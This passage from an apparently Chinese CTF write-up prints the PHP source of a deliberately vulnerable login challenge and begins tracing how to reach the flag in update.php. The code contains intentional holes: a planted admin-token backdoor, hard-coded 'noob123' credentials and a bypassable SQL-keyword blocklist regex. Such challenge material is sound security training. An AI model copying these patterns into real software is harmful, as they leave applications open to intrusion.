punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>    <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">sql</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">dbCtrl</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$hostname</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"127.0.0.1\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$dbuser</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"noob123\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$dbpass</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"noob123\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$database</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"noob123\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$name</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$mysqli</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$token</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>    <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">name</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">password</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">token</span><span class=\"token operator\">=</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'token'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">login</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>    <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">mysqli</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">mysqli</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">hostname</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">dbuser</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">dbpass</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">database</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">mysqli</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">connect_error</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"连接失败，错误:\"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">mysqli</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">connect_error</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>        <span class=\"token variable\">$result</span><span class=\"token operator\">=</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">mysqli</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">prepare</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>        <span class=\"token variable\">$result</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">bind_param</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'s'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>        <span class=\"token variable\">$result</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>        <span class=\"token variable\">$result</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">bind_result</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$idResult</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$passwordResult</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>        <span class=\"token variable\">$result</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">fetch</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>        <span class=\"token variable\">$result</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">token</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token variable\">$idResult</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$idResult</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>            <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'用户不存在!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">password</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!==</span><span class=\"token variable\">$passwordResult</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>            <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'密码错误！'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>        <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'token'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">name</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$idResult</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">update</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>    <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>        <span class=\"token comment\">// 还没来得及写</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>login.php</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">require_once</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'lib.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token delimiter important\">?&gt;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">http-equiv</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>Content-Type<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text/html; charset=utf-8<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/&gt;</span></span> </pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">&gt;</span></span>login<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>center</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>form</span> <span class=\"token attr-name\">action</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>login.php<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">method</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>post<span class=\"token punctuation\">\"</span></span> <span class=\"token special-attr\"><span class=\"token attr-name\">style</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token value css language-css\"><span class=\"token property\">margin-top</span><span class=\"token punctuation\">:</span> 300</span><span class=\"token punctuation\">\"</span></span></span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h2</span><span class=\"token punctuation\">&gt;</span></span>百万前端的用户信息管理系统<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h2</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h3</span><span class=\"token punctuation\">&gt;</span></span>半成品系统 留后门的程序员已经跑路<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h3</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        \t\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>username<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">placeholder</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>UserName<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">required</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>password<span class=\"token punctuation\">\"</span></span> <span class=\"token special-attr\"><span class=\"token attr-name\">style</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token value css language-css\"><span class=\"token property\">margin-top</span><span class=\"token punctuation\">:</span> 20</span><span class=\"token punctuation\">\"</span></span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>password<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">placeholder</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>password<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">required</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>button</span> <span class=\"token special-attr\"><span class=\"token attr-name\">style</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token value css language-css\"><span class=\"token property\">margin-top</span><span class=\"token punctuation\">:</span>20<span class=\"token punctuation\">;</span></span><span class=\"token punctuation\">\"</span></span></span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>登录<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>button</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">'</span>img/1.jpg<span class=\"token punctuation\">'</span></span><span class=\"token punctuation\">&gt;</span></span>大家记得做好防护<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>img</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token variable\">$user</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">user</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/union|select|drop|delete|insert|\\#|\\%|\\`|\\@|\\\\\\\\/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t\t<span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&lt;br&gt;Damn you, hacker!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t<span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/union|select|drop|delete|insert|\\#|\\%|\\`|\\@|\\\\\\\\/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t\t<span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Damn you, hacker!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t<span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t<span class=\"token variable\">$user</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">login</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token delimiter important\">?&gt;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>form</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>center</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr></tbody></table></figure><p>update.php</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">require_once</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'lib.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;html&gt;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>&lt;meta charset=\"utf-8\"&gt;</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>&lt;title&gt;update&lt;/title&gt;</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>&lt;h2&gt;这是一个未完成的页面，上线时建议删除本页面&lt;/h2&gt;</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>&lt;/html&gt;'<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'login'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">!=</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"你还没有登陆呢！\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token variable\">$users</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">User</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token variable\">$users</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">update</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'login'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">===</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token keyword\">require_once</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token delimiter important\">?&gt;</span></pre></td></tr></tbody></table></figure><p>大致浏览一下源码，很明显可以知道唯一获得 flag 的方式在 <code>update.php</code>  中的 <code>echo $flag;</code> ，要想进入语句，就要使 <code>$_SESSION['login']===1</code>  成立，而这一语句成立的位置为 <code>User</code>  类的 <code>login</code>  方法，对  <code>$_SESSION['login']</code>  进行赋值，但在进行该语句前，又会进入 <code>dbCtrl</code>  类的 <code>login</code>  方法中，查看此处 <code>login</code>  的逻辑</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">login</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">mysqli</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">mysqli</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">hostname</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">dbuser</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">dbpass</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">database</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">mysqli</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">connect_error</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"连接失败，错误:\"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">mysqli</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">connect_error</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token variable\">$result</span><span class=\"token operator\">=</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">mysqli</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">prepare</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token variable\">$result</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">bind_param</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'s'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token variable\">$result</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td 